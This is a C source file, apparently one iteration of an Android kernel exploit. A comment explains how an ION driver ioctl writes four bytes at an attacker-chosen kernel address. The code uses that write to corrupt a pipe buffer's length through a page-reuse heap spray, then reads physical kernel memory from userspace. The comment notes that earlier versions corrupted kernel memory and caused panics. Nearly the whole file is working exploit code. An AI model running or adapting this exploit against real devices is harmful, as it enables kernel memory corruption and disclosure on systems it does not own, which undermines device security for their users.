/* k138: the gate is a test-AND-write, so aim it only at pages we own.
 *
 * What actually happened, from the panic logs:
 *
 *     k128  __wake_up_common walked a list whose head was in a freed page
 *     k135  avtab_search_node faulted right after the sweep began
 *
 * Both are explained by one fact I had wrong. ION_IOC_PHYS is not a read-only oracle:
 *
 *     struct ion_phys_data *data = (struct ion_phys_data *)arg;
 *     dmabuf = dma_buf_get(data->fd);     reads *(u32 *)arg
 *     data->addr = meta->iova;            WRITES *(u32 *)(arg + 4)
 *
 * Every probe that succeeds stores four bytes at probe+4. Sweeping the linear map with
 * gate() therefore wrote IOVAs all over kernel memory - wherever a probed word happened
 * to be zero, which is most of free RAM and many struct fields. The scans were never
 * read-only.
 *
 * Two consequences:
 *
 *   1. gate() cannot be used to search. It is a primitive that writes on success.
 *   2. to store W the probe must be W-4, because the store lands at probe+4.
 *
 * Both are now used deliberately. The plan:
 *
 *   - allocate ION pages, learn their physical addresses, ZERO them, free them
 *   - create pipes one at a time, one byte each. Each pipe needs a kmalloc-1024 slab for
 *     its bufs[] array, so the freed pages get taken as slab pages rather than data pages
 *   - for each known physical page P, probe P+8. On a bufs[] array, buf[0] is
 *     { page = struct page *, offset = 0, len = 1, ops = &anon_pipe_buf_ops }, so P+8
 *     holds offset 0 and the probe succeeds, storing the IOVA at P+12 - that is
 *     buf[0].len, and it becomes 0x80000000
 *   - a pipe whose buf[0].len is 0x80000000 returns 4096 bytes twice for a one-byte
 *     write, which is how the corrupted pipe is found
 *
 * Every probe is confined to a page we allocated and freed, so nothing outside our own
 * memory can be touched. The guard checks P+0, P+12 and P+16 are all non-zero before
 * probing P+8, which is what a real bufs[] array looks like and what a zeroed free page
 * does not.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
struct ion_sync_range_data { s32 fd; u32 offset, size, note; };

#define ION_IOC_ALLOC      _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE       _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE      _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM     _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS       _IOWR(ION_TYPE, 9, struct ion_phys_data)
#define ION_IOC_SYNC_RANGE _IOWR(ION_TYPE, 11, struct ion_sync_range_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define NPRIME 24
#define NPIPE 40

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk(size_t len, int bit, int *h, int *f, u32 *iova){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = len; a.heap_id_mask = 1u << bit; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iova){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iova = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static void syncr(int fd, u32 off, u32 size, u32 note){
    struct ion_sync_range_data sr;
    memset(&sr, 0, sizeof sr);
    sr.fd = fd; sr.offset = off; sr.size = size; sr.note = note;
    ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);
}

int main(void){
    LOG = fopen("/data/local/tmp/k138.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k138 pid=%d uid=%d\n", getpid(), getuid());
    say("the probe writes at probe+4, so probe P+8 to set buf[0].len at P+12\n");
    say("no address outside our own freed pages is ever probed\n");

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){ rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }
    ionfd = open("/dev/ion", O_RDWR);
    if (ionfd < 0){ say("open errno=%d\n", errno); return 0; }

    int gh, gf; u32 giv = 0;
    if (!mk(PGSZ, 0, &gh, &gf, &giv)){ say("marker failed\n"); return 0; }
    say("marker fd=%d iova=0x%08x\n", gf, giv);

    static int hh[NPRIME], ff[NPRIME]; u8 *mm[NPRIME]; u32 ph_[NPRIME]; int n = 0;
    for (int i = 0; i < NPRIME; i++){
        int h, f;
        if (!mk(PGSZ, 0, &h, &f, NULL)) break;
        u8 *m = mmap(NULL, PGSZ, PROT_READ|PROT_WRITE, MAP_SHARED, f, 0);
        if (m == MAP_FAILED) break;
        for (size_t off = 0; off + 8 <= PGSZ; off += 8){
            memcpy(m + off, &gf, 4);
            memcpy(m + off + 4, &(u32){0x6B6B6B6B}, 4);
        }
        syncr(f, 0, PGSZ, 4);
        hh[n] = h; ff[n] = f; mm[n] = m; ph_[n] = 0; n++;
    }
    say("allocated %d buffers\n", n);
    if (n < 8) return 0;

    /* identify by requiring all 512 slots to answer; fd 0 is not a dmabuf yet so only
     * gf answers, which makes the identification unambiguous */
    int found = 0;
    for (u32 ph = 0x01000000; ph + PGSZ <= 0x80000000u && found < n; ph += PGSZ){
        u64 al = (u64)PAGE_OFFSET_V + ph - MEMSTART;
        if (gate(al) != 0) continue;
        int all = 1;
        for (size_t off = 8; off + 8 <= PGSZ; off += 8)
            if (gate(al + off) != 0){ all = 0; break; }
        if (all){ ph_[found] = ph; found++; }
    }
    say("identified %d/%d\n", found, n);
    if (found < 8) return 0;
    for (int i = 0; i < found; i++) say("  phys=0x%08x\n", ph_[i]);

    /* zero and free the ones above _text so that a slab, not the image, takes them */
    int nfree = 0;
    for (int i = 1; i < found; i++){
        memset(mm[i], 0, PGSZ);
        syncr(ff[i], 0, PGSZ, 4);
        munmap(mm[i], PGSZ);
        { struct ion_handle_data h; h.handle = hh[i]; ioctl(ionfd, ION_IOC_FREE, &h); }
        close(ff[i]);
        hh[i] = ff[i] = -1;
        ph_[nfree + 1] = ph_[i];
        nfree++;
    }
    say("freed %d zeroed pages\n", nfree);

    if (dup2(gf, 0) < 0){ say("dup2 errno=%d\n", errno); return 0; }
    say("fd 0 = marker dmabuf: the probe also accepts the word 0\n");

    /* pipes, one byte each: kmalloc-192, kmalloc-1024, then a data page */
    say("--- %d pipes, one byte each ---\n", NPIPE);
    static int pp[NPIPE][2]; int np = 0;
    for (int i = 0; i < NPIPE; i++){
        if (pipe(pp[np]) < 0) break;
        char c = 'x';
        if (write(pp[np][1], &c, 1) < 0) break;
        np++;
    }
    say("  %d pipes\n", np);

    /* probe only at P+8 on our own pages */
    say("--- probing P+8 on %d known pages ---\n", nfree);
    int fired = 0;
    for (int i = 1; i <= nfree; i++){
        u32 p = ph_[i];
        if (p < 0x01080000u) { say("  skip 0x%08x (below _text)\n", p); continue; }
        u64 al = (u64)PAGE_OFFSET_V + p - MEMSTART;
        int g0 = gate(al + 0);
        int g12 = gate(al + 12);
        int g16 = gate(al + 16);
        say("  page 0x%08x: [+0]=%s [+12]=%s [+16]=%s\n",
            p, g0 ? "nz" : "ZERO", g12 ? "nz" : "ZERO", g16 ? "nz" : "ZERO");
        if (g0 == 0 || g12 == 0 || g16 == 0){
            say("    looks like a fresh zero page, not a bufs array: not probing +8\n");
            continue;
        }
        errno = 0;
        int rc = gate(al + 8);
        say("    probe(+8) rc=%d errno=%d\n", rc, errno);
        if (rc == 0) fired++;
    }
    say("  probes that succeeded: %d\n", fired);

    /* did any pipe become unbounded? */
    say("--- testing the pipes ---\n");
    u8 *buf = malloc(PGSZ);
    int victim = -1;
    for (int i = 0; i < np; i++){
        ssize_t r1 = read(pp[i][0], buf, PGSZ);
        if (r1 != PGSZ) continue;
        ssize_t r2 = read(pp[i][0], buf, PGSZ);
        if (r2 == PGSZ){ victim = i; break; }
    }
    if (victim < 0){
        say("  no pipe returned an oversized read\n");
        free(buf);
        say("K138 done (no read primitive)\n");
        return 0;
    }
    say("  *** pipe %d returned 4096 twice for a one-byte write ***\n", victim);

    say("--- walking physical memory ---\n");
    long scanned = 0;
    long banner_at = -1;
    while (scanned < (600L*1024*1024)){
        ssize_t r = read(pp[victim][0], buf, PGSZ);
        if (r <= 0){ say("  stopped at %ld MB (r=%zd errno=%d)\n",
                          scanned/(1024*1024), r, errno); break; }
        if (banner_at < 0){
            void *q = memmem(buf, r, "Linux version", 13);
            if (q) banner_at = scanned + ((u8*)q - buf);
        }
        scanned += r;
        if (banner_at >= 0) break;
    }
    say("  walked %ld MB\n", scanned/(1024*1024));

    say("--- result ---\n");
    if (banner_at >= 0){
        say("  \"Linux version\" found at stream offset %ld\n", banner_at);
        if ((u32)banner_at < 0x01735090u)
            say("  => read origin phys = 0x%08x\n", 0x01735090u - (u32)banner_at);
        say("  the linear map is readable from userspace\n");
    } else {
        say("  the read worked but the banner was not in the first %ld MB\n",
            scanned/(1024*1024));
    }
    free(buf);
    say("K138 done\n");
    return 0;
}
